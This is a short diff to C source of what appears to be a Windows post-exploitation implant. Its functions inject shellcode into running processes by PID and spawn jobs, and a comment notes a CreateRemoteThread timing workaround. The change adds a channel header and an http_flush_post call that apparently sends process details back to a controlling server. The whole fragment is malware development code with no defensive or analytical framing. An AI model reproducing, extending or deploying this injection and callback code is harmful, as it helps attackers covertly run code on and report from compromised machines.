@@ -15,6 +15,7 @@
 #include <WinSock2.h>
 #include "jobs.h"
 #include "x86trace.h"
+#include "channel.h"
 
 /* inject some shellcode... enclosed stuff is the shellcode y0 */
 void command_inject_pid(char * buffer, int length, BOOL x86) {
@@ -266,7 +267,8 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 		char line[80];
 		_snprintf(line, sizeof(line), "spawn_x86=%d pid=%u target64=%d\n",
 			(int)x86, (unsigned)pi.dwProcessId, (int)is_x64_process(pi.hProcess));
-		command_shell_post(line, (int)lstrlenA(line), CALLBACK_OUTPUT, TRUE);
+		command_shell_post(line, (int)lstrlenA(line), CALLBACK_OUTPUT, FALSE);
+		http_flush_post(post_url);
 	}
 
 	/* timing shim (this is *required* for Win7/Win7 x64--or else we will get a error 8 with CreateRemoteThread) */
